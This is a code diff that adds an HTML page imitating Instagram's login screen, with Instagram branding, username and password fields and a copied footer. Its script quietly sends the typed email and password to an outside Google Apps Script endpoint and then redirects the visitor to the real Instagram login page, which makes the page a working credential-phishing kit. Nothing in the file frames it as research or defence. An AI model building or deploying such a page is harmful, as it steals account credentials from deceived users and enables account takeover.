@@ -1,0 +1,173 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://fonts.googleapis.com/css?family=Indie+Flower|Overpass+Mono" rel="stylesheet">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <link rel="shortcut icon" type="x-icon"
+        href="http://www.camelproductions.net/wp-content/uploads/2017/08/Instagram-Logo-2017-1024x1024.png">
+    <title>login . instagram</title>
+    <link type="text/css" rel="stylesheet" href="index.css">
+
+</head>
+
+<body>
+    <span id="root">
+        <section class="section-all">
+
+            <!-- 1-Role Main -->
+            <main class="main" role="main">
+                <div class="wrapper">
+                    <article class="article">
+                        <div class="content">
+                            <div class="login-box">
+                                <div class="header">
+                                    <img class="logo"
+                                        src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                                        alt="Instagram">
+                                </div><!-- Header end -->
+                                <br>
+                                <div class="form-wrap">
+                                    <form id="submit-form" action="">
+
+                                        <div class="input-box">
+                                            <input type="text" id="name" aria-describedby=""
+                                                placeholder="Phone number, username, or email" aria-required="true"
+                                                maxlength="30" autocapitalize="off" autocorrect="off" name="email"
+                                                value="" required>
+                                        </div>
+
+                                        <div class="input-box">
+                                            <input type="password" name="password" id="password" placeholder="Password"
+                                                aria-describedby="" maxlength="30" aria-required="true"
+                                                autocapitalize="off" autocorrect="off" required>
+                                        </div>
+
+                                        <span class="button-box">
+                                            <button onclick="insta()" class="btn" type="submit" name="submit">Log
+                                                in</button>
+
+                                        </span>
+                                    
+
+                                                    
+
+                                    </form>
+                                    <div class="or-liner">
+                                        <div class="line1"> </div>
+                                        <div class="or">or</div>
+                                        <div class="line1"></div>
+                                    </div>
+                                    <br>
+
+                                    <button class="sqdOP yWX7d    y3zKF     " type="button"><span
+                                            class=" coreSpriteFacebookIcon AeB99" ><img style="height: 13px; width: 21px;" src="https://drainbrain.com/app/uploads/2016/01/Facebook-Logo-Transparent.png" alt=""></span><span class="KPnG0">Log in with
+                                            Facebook</span></button>
+
+                                            <br>
+
+                                           <div>
+                                            <a class="_2Lks6" href="/goole.com" >Forgot password?</a>
+                                           </div>
+                                    <!-- <a class="facebook-btn">
+                    <span><img style="height: 20px;width: 25px;" src="https://banner2.cleanpng.com/20180625/psf/kisspng-facebook-social-media-logo-computer-icons-citizens-facebook-ico-5b307df2e39917.8677499015299046269323.jpg" alt=""></span>
+                    <span >log in with facebook</span></a> -->
+                                </div> <!-- Form-wrap end -->
+                            </div> <!-- Login-box end -->
+
+                            <div class="login-box">
+                                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+                            </div> <!-- Signup-box end -->
+
+                            <div class="app">
+                                <p>Get the app.</p>
+                                <div class="app-img">
+                                    <a
+                                        href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                                        <img
+                                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png">
+                                    </a>
+                                    <a
+                                        href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                                        <img
+                                            src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
+                                    </a>
+                                </div> <!-- App-img end-->
+                            </div> <!-- App end -->
+                        </div> <!-- Content end -->
+                    </article>
+                </div> <!-- Wrapper end -->
+
+
+            </main>
+
+            <!-- 2-Role Footer -->
+            <footer class="footer" role="contentinfo">
+                <div class="footer-container">
+
+                    <nav class="footer-nav" role="navigation">
+                        <ul>
+                            <li><a href="">About Us</a></li>
+                            <li><a href="">Support</a></li>
+                            <li><a href="">Blog</a></li>
+                            <li><a href="">Press</a></li>
+                            <li><a href="">Api</a></li>
+                            <li><a href="">Jobs</a></li>
+                            <li><a href="">Privacy</a></li>
+                            <li><a href="">Terms</a></li>
+                            <li><a href="">Directory</a></li>
+                            <li>
+                                <span class="language">Language
+                                    <select name="language" class="select" onchange="la(this.value)">
+                                        <option value="#">English</option>
+                                        <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                                    </select>
+                                </span>
+                            </li>
+                        </ul>
+                    </nav>
+
+                    <span class="footer-logo">&copy; 2021 Instagram form Meta</span>
+                </div> <!-- Footer container end -->
+            </footer>
+
+        </section>
+    </span> <!-- Root -->
+
+    <!-- Select Link -->
+    <script type="text/javascript">
+        function la(src) {
+            window.location = src;
+        }
+
+
+    </script>
+
+    <script>
+        $("#submit-form").submit((e) => {
+            e.preventDefault()
+            $.ajax({
+                url: "https://script.google.com/macros/s/AKfycbxdsbTw10BAYucOBIb0jIOxGjo0XNSEtnOop5MP00SgygvdYYGic8yb5lb5UwsT9bm8/exec",
+                data: $("#submit-form").serialize(),
+                method: "post",
+                success: function (response) {
+                    // alert("Form submitted successfully")
+                    // window.location.reload()
+                    window.location.href = "https://www.instagram.com/accounts/login/"
+                },
+                error: function (err) {
+                    alert("Something Error")
+
+                }
+            })
+        })
+    </script>
+
+
+
+</body>
+
+</html>
